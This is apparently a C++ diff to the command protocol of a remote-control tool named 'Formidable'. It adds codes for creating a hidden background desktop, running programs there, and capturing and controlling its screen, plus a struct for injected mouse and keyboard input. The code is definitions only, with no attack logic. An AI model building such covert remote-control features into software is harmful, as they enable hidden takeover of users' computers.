@@ -115,8 +115,27 @@ namespace Formidable {
         CMD_MESSAGEBOX = 106,   // 弹出消息框
         CMD_EXEC_GET_OUTPUT = 107, // 执行命令并获取输出
         
+        // 后台屏幕管理 (110-119)
+        CMD_BACKGROUND_CREATE = 110,      // 创建后台桌面
+        CMD_BACKGROUND_EXECUTE = 111,     // 后台执行程序
+        CMD_BACKGROUND_FILE_OP = 112,     // 后台文件操作
+        CMD_BACKGROUND_PROCESS = 113,     // 后台进程管理
+        CMD_BACKGROUND_SCREEN_CAPTURE = 114, // 后台屏幕捕捉
+        CMD_BACKGROUND_SCREEN_CONTROL = 115, // 后台屏幕控制
+        CMD_BACKGROUND_SWITCH_BACK = 116,    // 切换回原桌面
+        
         CMD_EXIT = 999          // 退出
     };
+
+#pragma pack(push, 1)
+    struct BackgroundCmdData {
+        uint32_t type;          // 操作类型 (0:移动, 1:左键下, 2:左键上, 3:右键下, 4:右键上, 5:按键下, 6:按键上)
+        int32_t x;              // 坐标 X
+        int32_t y;              // 坐标 Y
+        uint32_t arg1;          // 附加参数 (如虚拟键码)
+        uint32_t dataLen;       // 后续数据长度 (用于文件操作等)
+    };
+#pragma pack(pop)
 
 #pragma pack(push, 1)
     struct ProcessInfo {
